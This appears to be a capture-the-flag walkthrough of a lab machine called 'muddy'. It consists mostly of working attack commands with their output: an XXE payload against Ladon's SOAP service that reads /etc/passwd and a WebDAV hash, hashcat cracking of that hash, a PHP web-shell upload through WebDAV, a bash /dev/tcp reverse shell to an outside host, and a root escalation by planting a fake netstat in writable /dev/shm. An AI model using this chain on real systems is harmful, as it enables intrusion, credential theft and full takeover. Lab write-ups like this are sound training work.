# Export
```bash
export IP="192.168.69.161"
export URL="http://192.168.69.161:80/FUZZ"
```

<hr>

# Credentials
+ Web: `administrant:sleepless`
```bash
$ hashcat -m 1600 -a 0 hash /usr/share/wordlists/rockyou.txt
[...]
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392                         
* Bytes.....: 139921507
* Keyspace..: 14344385                         
* Runtime...: 1 sec                            

$apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0:sleepless
```

<hr>

# RCE
+ WebDav: UPLOAD + MOVE

+ UPLOAD
```bash
$ curl -u administrant:sleepless -T 'cmback.txt' 'http://muddy.ugc/webdav/'
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webdav/cmback.txt has been created.</p>
<hr />
<address>Apache/2.4.38 (Debian) Server at muddy.ugc Port 80</address>
</body></html>
```

+ MOVE
```bash
curl -X MOVE --header 'Destination:http://muddy.ugc/webdav/cmback.php' 'http://muddy.ugc/webdav/cmback.txt' -u administrant:sleepless
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Destination /webdav/cmback.php has been created.</p>
<hr />
<address>Apache/2.4.38 (Debian) Server at muddy.ugc Port 80</address>
</body></html>
```

+ Code execution

```bash
$ curl -u administrant:sleepless -s http://muddy.ugc/webdav/cmback.php\?1=whoami                                                                                                        1 ⚙
www-data
```

+ Payload

```md
bash -c \"bash -i >& /dev/tcp/192.168.49.227/80 0>&1\"
```

+ URL Encoded Payload

```md
bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.49.227%2F80+0%3E%261%22
```

+ Reverse shell
```bash
$ curl -u administrant:sleepless -s http://muddy.ugc/webdav/cmback.php\?1=bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.49.227%2F80+0%3E%261%22
```

```bash
$ nc -nlvp 80     
listening on [any] 80 ...
connect to [192.168.49.227] from (UNKNOWN) [192.168.227.161] 55638
bash: cannot set terminal process group (574): Inappropriate ioctl for device
bash: no job control in this shell
www-data@muddy:/var/www/html/webdav$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<hr>

# Privilege Escalation
+ Crontab?

```bash
www-data@muddy:/var/www/html$ cat /etc/crontab

SHELL=/bin/sh
PATH=/dev/shm:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

...

*  *    * * *   root    netstat -tlpn > /root/status && service apache2 status >> /root/status && service mysql status >> /root/status
```

+ `/dev/shm` is writable

```bash
www-data@muddy:~$ echo "chmod +s /bin/bash" > /dev/shm/netstat
www-data@muddy:~$ chmod 777 /dev/shm/netstat
www-data@muddy:~$ bash -p
bash-5.0# whoami
root
```

<hr>

# Nmap
```bash
PORT     STATE SERVICE       REASON         VERSION 
22/tcp   open  ssh           syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:  
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkD
neyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I
2r                        
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=
|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+
25/tcp   open  smtp          syn-ack ttl 63 Exim smtpd
| smtp-commands: muddy Hello nmap.scanme.org [192.168.49.69], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP, 
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 
80/tcp   open  http          syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))
| http-methods:                      
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Did not follow redirect to http://muddy.ugc/
111/tcp  open  rpcbind       syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  tcpwrapped    syn-ack ttl 63
808/tcp  open  ccproxy-http? syn-ack ttl 63
908/tcp  open  unknown       syn-ack ttl 63
8888/tcp open  http          syn-ack ttl 63 WSGIServer 0.1 (Python 2.7.16)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: WSGIServer/0.1 Python/2.7.16
|_http-title: Ladon Service Catalog
```

<hr>

# Web Application
#### Port 80

+ Domain: `muddy.ugc`.
+ Web tech: PHP
+ Directory

```bash
index.php               [Status: 200, Size: 19195, Words: 860, Lines: 351]
javascript              [Status: 301, Size: 321, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10]
webdav                  [Status: 401, Size: 461, Words: 42, Lines: 15]
wp-admin                [Status: 301, Size: 319, Words: 20, Lines: 10]
wp-content              [Status: 301, Size: 321, Words: 20, Lines: 10]
wp-includes             [Status: 301, Size: 322, Words: 20, Lines: 10]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1]
```

+ Use XXE to read config file.
```md
→ Read /var/www/html/webdav/passwd.dav

[...]
      <result>Serial number: administrant:$apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0</result>
[...]
```

#### Port 8888
+ Ladon
```bash
curl -s http://muddy.ugc:8888/                                                                                                                                                        1 ⚙

...

                <div class="catName">Ladon Service Catalog</div>
              
...

                <div class="catGen">Powered by Ladon for Python</div>
        </body>
</html>                         
```

+ Muddy service

```bash
curl -s http://muddy.ugc:8888/muddy | html2text                                                                                                                                       1 ⚙
muddy
skins: [One of: Default/Bluebox/Rounded]
Service Description:
None
Available Interfaces:
    * xmlrpc [ url description ]
    * jsonrpc10 [ url description ]
    * jsonwsp [ url description ]
    * soapdocumentliteral [ url description ]
    * soap11 [ url description ]
    * soap [ url description ]
Methods:
    * checkout (  string  uid )
      None
      Paramters:
          o uid:  string
            None
      Returns:  string
      None
Types:
Powered by Ladon for Python
```


+ PoC
```bash
searchsploit ladon  
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
Ladon Framework for Python 0.9.40 - XML External Entity Exp | xml/webapps/43113.txt
------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

+ Payload / Response
```md
# curl -s -X $'POST' \
> -H $'Content-Type: text/xml;charset=UTF-8' \
> -H $'SOAPAction: \"http://muddy.ugc:8888/muddy/soap11/checkout\"' \
> --data-binary $'<?xml version="1.0"?>
quote> <!DOCTYPE uid
[<!ENTITY passwd SYSTEM "file:///etc/passwd">
]>
quote> <soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
quote> xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"

quote> xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
quote> xmlns:urn=\"urn:muddy\"><soapenv:Header/>
quote> <soapenv:Body>
quote> <urn:checkout soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
<uid xsi:type=\"xsd:string\">&passwd;</uid>
quote> </urn:checkout>
</soapenv:Body>
</soapenv:Envelope>' \
> 'http://muddy.ugc:8888/muddy/soap11' | xmllint --format -

<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="urn:muddy" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <SOAP-ENV:Body SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <ns:checkoutResponse>
      <result>Serial number: 
	  [...]
	  
	  ian:x:1000:1000::/home/ian:/bin/sh
	  
	  [...]
	  </result>
    </ns:checkoutResponse>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```


